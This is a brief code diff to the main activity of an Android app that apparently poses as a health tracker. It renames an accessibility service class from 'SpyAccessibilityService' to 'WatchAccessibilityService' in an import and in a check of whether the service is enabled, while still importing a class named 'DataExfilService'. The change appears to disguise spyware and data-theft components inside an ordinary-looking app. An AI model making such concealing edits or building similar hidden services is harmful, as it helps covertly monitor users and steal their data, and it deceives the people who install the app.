@@ -34,7 +34,7 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import android.provider.Settings
 import android.widget.Toast
-import com.inf2007.healthtracker.utilities.SpyAccessibilityService
+import com.inf2007.healthtracker.utilities.WatchAccessibilityService
 import android.content.ComponentName
 import com.inf2007.healthtracker.utilities.DataExfilService
 
@@ -439,7 +439,7 @@ class MainActivity : ComponentActivity() {
                 Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
             ) ?: ""
 
-            val serviceName = ComponentName(this, SpyAccessibilityService::class.java).flattenToString()
+            val serviceName = ComponentName(this, WatchAccessibilityService::class.java).flattenToString()
             enabledServices.contains(serviceName)
         } catch (e: Exception) {
             false
